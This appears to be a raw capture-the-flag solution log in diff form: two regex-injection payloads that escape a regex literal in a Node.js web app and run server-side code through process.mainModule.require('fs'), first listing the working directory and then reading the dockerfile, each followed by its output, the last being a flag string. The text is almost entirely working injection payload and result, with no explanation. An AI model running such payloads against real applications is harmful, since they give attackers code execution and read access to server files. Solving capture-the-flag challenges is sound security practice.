@@ -1,0 +1,7 @@
+abc/gi);let files = [];const fs = process.mainModule.require('fs'); fs.readdirSync(".").forEach(file =>  files.push(file) ); return files;/
+	{ "result": [ ".dockerignore", "api.js", "csregex", "dist", "dockerfile", "index.js", "leftover.js", "node_modules", "package-lock.json", "package.json", "regexer.js", "requests.log", "simple-fs.js" ] }
+
+
+
+abc/gi);const fs = process.mainModule.require('fs'); const data = fs.readFileSync('dockerfile', 'utf8'); return(data);/
+	CSR{r363x_15_fun_r363x_15_l0v3}
